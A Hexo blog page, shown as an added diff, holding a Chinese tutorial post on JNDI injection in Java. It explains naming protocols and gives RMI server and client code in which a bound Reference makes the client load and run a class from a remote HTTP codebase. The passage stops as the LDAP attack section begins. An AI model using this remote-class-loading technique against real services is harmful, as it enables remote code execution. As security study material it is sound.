@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/luo.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/luo.jpg">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"luokuang1.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":true,"show_result":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideDownBigOut"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="推荐链接：https:&#x2F;&#x2F;goodapple.top&#x2F;archives&#x2F;696 概念定义首先在jndi中常见的有四个协议,一般是将一个命名空间来存储java对象，这里就可能存在一种可能如果通过字符串来解析为一个java对象的话就可能会存在利用的问题 1234LDAP  &#x2F;&#x2F;轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容RMI   &#x2F;&#x2F;J">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JNDI注入">
+<meta property="og:url" content="https://luokuang1.github.io/2025/01/23/JNDI%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="luokuang的博客">
+<meta property="og:description" content="推荐链接：https:&#x2F;&#x2F;goodapple.top&#x2F;archives&#x2F;696 概念定义首先在jndi中常见的有四个协议,一般是将一个命名空间来存储java对象，这里就可能存在一种可能如果通过字符串来解析为一个java对象的话就可能会存在利用的问题 1234LDAP  &#x2F;&#x2F;轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容RMI   &#x2F;&#x2F;J">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=NmY5OTdjNTE3YTRjOTExN2RmOWI4NjFkYjI4NzdkYzlfcWx1ZzJzWjdJS3A1bnhsemg1bkhqeUZvS3FiVkZWVG9fVG9rZW46RXdWVGJYenNrb1F3TFR4OXdWbmNTZXFRbmdiXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=MzA1YjUzMWY3NzJjNjFjNjdhZWFjOTkzMjAwMGZjODVfamNaQXJHRWtZT2x6dklDdXR4Q3JJb2ZzU1N3MkU3YlZfVG9rZW46WWQ2d2JMaHNDb29aRkJ4Y1k2cWMxYVU4bkhoXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=NTJiYjlkNTQ1ZGI5MGIwNDc0MzViNWZjMjAwN2I5NWNfZ2R4QkJpa0s1ejhwNVJENnBWcnp0Q3pFUkhLWTZmd0RfVG9rZW46VWxVWWJNY2FOb2gwTzB4VzNUSWNubWVmbjRnXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=NWM5YjFkOGIxMWNkZjY0NmRlMzcwYmU5MWY1ZGQzMjhfcWFGUFV5OGdDQ3A5UGV6T2FTcktPanF1aGdFMFp6MG9fVG9rZW46UzVtbGJQS1dDb0dTd254eHY2d2NRdmJkbmtnXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=NjZmNDI5M2IyZmJjNGY3YmJhZGQzNTlhOGJmNjc3NTlfYXF2Qk92NzdRVHA3VTZmeFpaUThzRTBOOXpKZk1sdURfVG9rZW46S1BPR2JGZEpwb3BmUHh4a2VMSWNRWlpKblFjXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=YWJmMDVhNjcwYmVjODU3ZmY5YTI1MWNmMThhZTBkYThfWXJqN25CbnBjZHVRS0RJcE4zYUM0UHZUTWpFcDFxeFhfVG9rZW46SmtMcmJoUnFwb0pMdU54SnltT2NQWnJabnNiXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=MzRhMzc2ODgxOTJjNzdiOTQ3NDAwMjhiYWZjOTExN2NfWjNGb09sYnFubUkyNmU0dWhFWjJZdHFHS05wbnhXamhfVG9rZW46VnFJU2JyaEk4b29HS2Z4amMwT2N5SlY4bnplXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=NTcyYTY2YzQ3MmEzOTJkNWRiNzYwNGRiM2IxMzg0YzNfckhJUDNGcjZiTUE0Vm91SmhhU2k1NzliN3BGRDRaYjVfVG9rZW46VU44OGJxcEYzb25mNmN4cDdrNWM3MVdyblRlXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=ODFiOGE4M2Q2OGVhMzNjZTBiYjQ1YjVhZjMwMTAwOGNfQmdpeDR5M0tjQUxHd3NQN0xtb2tveFdTeFpaZ3o2TFBfVG9rZW46QWhISGJISXZhb3BBUU14RkJxMWNIa3psblFjXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=NGJhYmViM2FhZDE0N2FmMTBiZGM5ZGQ5MGUxNDdlODNfSEpMRXhPeWg4M2xIT0xvTHNIRHVhc25Eakoza0FsUU5fVG9rZW46QWxlUmI2QklsbzRDb0h4VW9LMGNJZ3BabmdoXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=OTVkYWY1NWFhYjU3YTIwMTdjZGZiODM5YmU3YTllNmVfeGVVMXdpSW1SeFBGcDVCWFU5OVc3RFpXRDJvR0l4QVpfVG9rZW46VXJub2J5RVpEb2hxWjd4NzBCOWMySGVWbnJmXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTc4YjBiZDZlNzY3OGNjOTRmYmEzZTM1MTlhZjJmZDJfWVp1UUVLZDU3Y2p6Q0lFQ3hNMkxIUTZzU043cDNaN0FfVG9rZW46V1BJemJlell2b3BkbHJ4M0s2YWNIaXIxbm1lXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=YmY0MmZjNjBmZDljMDlhY2M1MjI1NWE4MDIxN2MzYjdfbEs4QzRPSE42NGZ2bUsyS0hzZzBUOGVVWW9WT0hNYkxfVG9rZW46V0tWY2J4TXhtb0ZIMmF4a2ttVWNwUHZUbndIXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=M2EzMDg4ODJlMzcwYWQ2ZDQwNzYyZjU2NDA0N2EyNTdfb0hCNU04RWJaeFhXZHVyVjFqWUZWVVFmRXgyY2tlOUxfVG9rZW46SFNsV2I3aEdEb005bkp4MkxuSGNwclF4bmRkXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=YmU1OWIyZjhjYzg2YjgwNjhlMTlkZTJlNjZlOWJiZjFfMU0xeEt4cFFBU0tFQlV6clg0bE9WVWZ3aEk2RmpMR2NfVG9rZW46SVVxeWJrSTA2b0VsR2F4UnBsR2NvSWI2bm1oXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="og:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=MTEwODIwMDAyMWMyOGY2ZWJmNWVkMmU0ODY0ZTRlZjlfQ1Fsd3JnajhmUHFBUzJaOUJVTDJZY2JsVTVRa2xxTldfVG9rZW46UzJYdWJENE96b2tkdFF4S1dMemNiNjFmbjNyXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+<meta property="article:published_time" content="2025-01-23T08:29:32.000Z">
+<meta property="article:modified_time" content="2025-02-14T08:29:59.644Z">
+<meta property="article:author" content="luokuang">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=NmY5OTdjNTE3YTRjOTExN2RmOWI4NjFkYjI4NzdkYzlfcWx1ZzJzWjdJS3A1bnhsemg1bkhqeUZvS3FiVkZWVG9fVG9rZW46RXdWVGJYenNrb1F3TFR4OXdWbmNTZXFRbmdiXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA">
+
+
+<link rel="canonical" href="https://luokuang1.github.io/2025/01/23/JNDI%E6%B3%A8%E5%85%A5/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://luokuang1.github.io/2025/01/23/JNDI%E6%B3%A8%E5%85%A5/","path":"2025/01/23/JNDI注入/","title":"JNDI注入"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>JNDI注入 | luokuang的博客</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+<link rel="alternate" href="/atom.xml" title="luokuang的博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">luokuang的博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li><li class="menu-item menu-item-links"><a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5%E5%AE%9A%E4%B9%89"><span class="nav-number">1.</span> <span class="nav-text">概念定义</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI-RMI%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">JNDI+RMI注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JNDI-LDAP%E6%B3%A8%E5%85%A5"><span class="nav-number">3.</span> <span class="nav-text">JNDI+LDAP注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BB%8B%E7%BB%8D"><span class="nav-number">3.1.</span> <span class="nav-text">基本介绍</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="nav-number">3.2.</span> <span class="nav-text">攻击流程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%AB%98%E7%89%88%E6%9C%ACjdk%E7%BB%95%E8%BF%87-tomcat8%E7%8E%AF%E5%A2%83"><span class="nav-number">4.</span> <span class="nav-text">高版本jdk绕过(tomcat8环境)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A1%A5%E4%B8%81%E7%9A%84%E5%BD%A2%E5%BC%8F"><span class="nav-number">4.1.</span> <span class="nav-text">补丁的形式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">4.2.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#tomcat8"><span class="nav-number">4.2.1.</span> <span class="nav-text">tomcat8</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Groovy"><span class="nav-number">4.2.2.</span> <span class="nav-text">Groovy</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="luokuang"
+      src="/images/luo.jpg">
+  <p class="site-author-name" itemprop="name">luokuang</p>
+  <div class="site-description" itemprop="description">沉淀，还得继续沉淀</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://luokuang1.github.io/2025/01/23/JNDI%E6%B3%A8%E5%85%A5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/luo.jpg">
+      <meta itemprop="name" content="luokuang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="luokuang的博客">
+      <meta itemprop="description" content="沉淀，还得继续沉淀">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="JNDI注入 | luokuang的博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JNDI注入
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2025-01-23 16:29:32" itemprop="dateCreated datePublished" datetime="2025-01-23T16:29:32+08:00">2025-01-23</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2025-02-14 16:29:59" itemprop="dateModified" datetime="2025-02-14T16:29:59+08:00">2025-02-14</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>推荐链接：<a target="_blank" rel="noopener" href="https://goodapple.top/archives/696">https://goodapple.top/archives/696</a></p>
+<h3 id="概念定义"><a href="#概念定义" class="headerlink" title="概念定义"></a>概念定义</h3><p>首先在jndi中常见的有四个协议,一般是将一个命名空间来存储java对象，这里就可能存在一种可能如果通过字符串来解析为一个java对象的话就可能会存在利用的问题</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">LDAP  <span class="comment">//轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容</span></span><br><span class="line">RMI   <span class="comment">//JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象</span></span><br><span class="line">DNS   <span class="comment">//域名服务</span></span><br><span class="line">CORBA <span class="comment">//公共对象请求代理体系结构</span></span><br></pre></td></tr></table></figure>
+<h3 id="JNDI-RMI注入"><a href="#JNDI-RMI注入" class="headerlink" title="JNDI+RMI注入"></a>JNDI+RMI注入</h3><p>在服务器里面部署恶意的的对象，在客户端进行加载的时候就会触发恶意代码，这里就需要先部署好前置的服务器</p>
+<p>在jndi里面结合rmi就一共有两种运用方式，在jndi中它需要创建一个上下文，就相当于一个存放的容器，其中的容器的绑定对象形式不一样，它可以像rmi一样直接绑定远程对象就是打原生的rmi反序列化</p>
+<p>例子如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI1Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1089</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1089/luokuang&quot;</span>,<span class="keyword">new</span> <span class="title class_">JNDI1Object</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//client</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI1Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">register</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1089</span>);</span><br><span class="line">        <span class="type">JNDI1Interface</span> <span class="variable">stub</span> <span class="operator">=</span> (JNDI1Interface) register.lookup(<span class="string">&quot;luokuang&quot;</span>);</span><br><span class="line">        System.out.println(stub.aaa());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里调用的是InitialContext的rebind方法，但是跟进就发现其实还是调用了原生的rmi的rebind方法</p>
+<p>先是调用到RegistryContext的rebind方法</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=NmY5OTdjNTE3YTRjOTExN2RmOWI4NjFkYjI4NzdkYzlfcWx1ZzJzWjdJS3A1bnhsemg1bkhqeUZvS3FiVkZWVG9fVG9rZW46RXdWVGJYenNrb1F3TFR4OXdWbmNTZXFRbmdiXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<p>接下来就调用到了RegistryImpl_Stub的rebind方法</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=MzA1YjUzMWY3NzJjNjFjNjdhZWFjOTkzMjAwMGZjODVfamNaQXJHRWtZT2x6dklDdXR4Q3JJb2ZzU1N3MkU3YlZfVG9rZW46WWQ2d2JMaHNDb29aRkJ4Y1k2cWMxYVU4bkhoXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<p>所以如果通过直接绑定远程对象其实可以和原生rmi一样进行攻击，但是这个其实不算真正的JNDI注入，下面就是通过jndi绑定对象支持绑定引用对象，所以这里就通过绑定一个恶意的引用对象来实现</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//server</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI1Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1089</span>);</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="comment">//Reference reference = new Reference(&quot;rce&quot;, &quot;rce&quot;, &quot;http://127.0.0.1:9000/&quot;);</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>, <span class="string">&quot;http://127.0.0.1:9000/&quot;</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1089/luokuang&quot;</span>,referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//client</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDI1Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1089/luokuang&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">lookup</span> <span class="operator">=</span> initialContext.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>本地通过python起一个http服务，成功执行代码</p>
+<p>这里的主要思想就是通过我们创建一个恶意的服务，当目标服务器进行远程调用时就进行触发</p>
+<p>下面就去看看具体的执行代码的流程</p>
+<p>一路lookup调用，最后到达RegistryContext的lookup调用到decodeObject方法里面，最终走出RegistryContext去到NamingManager里面</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=NTJiYjlkNTQ1ZGI5MGIwNDc0MzViNWZjMjAwN2I5NWNfZ2R4QkJpa0s1ejhwNVJENnBWcnp0Q3pFUkhLWTZmd0RfVG9rZW46VWxVWWJNY2FOb2gwTzB4VzNUSWNubWVmbjRnXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=NWM5YjFkOGIxMWNkZjY0NmRlMzcwYmU5MWY1ZGQzMjhfcWFGUFV5OGdDQ3A5UGV6T2FTcktPanF1aGdFMFp6MG9fVG9rZW46UzVtbGJQS1dDb0dTd254eHY2d2NRdmJkbmtnXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<p>这里其实就已经走去了rmi，去往了一个通用的类，一直走到NamingManager的getObjectInstance方法里面，调用getObjectFactoryFromReference来进行类加载</p>
+<p><img src="https://j1ubdyryizx.feishu.cn/space/api/box/stream/download/asynccode/?code=NjZmNDI5M2IyZmJjNGY3YmJhZGQzNTlhOGJmNjc3NTlfYXF2Qk92NzdRVHA3VTZmeFpaUThzRTBOOXpKZk1sdURfVG9rZW46S1BPR2JGZEpwb3BmUHh4a2VMSWNRWlpKblFjXzE3Mzk1MjE3NTQ6MTczOTUyNTM1NF9WNA" alt="img"></p>
+<p>所以其实不只是jndi与rmi结合有问题，其它协议也是一样</p>
+<h3 id="JNDI-LDAP注入"><a href="#JNDI-LDAP注入" class="headerlink" title="JNDI+LDAP注入"></a>JNDI+LDAP注入</h3><h4 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h4><p>LDAP（Lightweight Directory Access Protocol ，轻型目录访问协议）是一种目录服务协议，运行在TCP/IP堆栈之上。LDAP目录服务是由目录数据库和一套访问协议组成的系统，目录服务是一个特殊的数据库，用来保存描述性的、基于属性的详细信息，能进行查询、浏览和搜索，以树状结构组织数据。LDAP目录服务基于客户端-服务器模型，它的功能用于对一个存在目录数据库的访问。  LDAP目录和RMI注册表的区别在于是前者是目录服务，并允许分配存储对象的属性。</p>
+<p>也就是说，LDAP <strong>「是一个协议」</strong>，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容。而 <strong>「LDAP 协议的实现」</strong>，有着众多版本，例如微软的  Active Directory 是 LDAP 在 Windows 上的实现。AD 实现了 LDAP  所需的树形数据库、具体如何解析请求数据并到数据库查询然后返回结果等功能。再例如 OpenLDAP 是可以运行在 Linux 上的 LDAP  协议的开源实现。而我们平常说的 LDAP Server，一般指的是安装并配置了 Active Directory、OpenLDAP  这些程序的服务器。</p>
+<p>在LDAP中，我们是通过目录树来访问一条记录的，目录树的结构如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dn ：一条记录的详细位置</span><br><span class="line">dc ：一条记录所属区域    (哪一颗树)</span><br><span class="line">ou ：一条记录所属组织    （哪一个分支）</span><br><span class="line">cn/uid：一条记录的名字/ID   (哪一个苹果名字)</span><br><span class="line">...</span><br><span class="line">LDAP目录树的最顶部就是根，也就是所谓的<span class="string">&quot;基准DN&quot;</span>。</span><br></pre></td></tr></table></figure>
+<h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h4><p>这里主要通过导入依赖来创建环境</p>
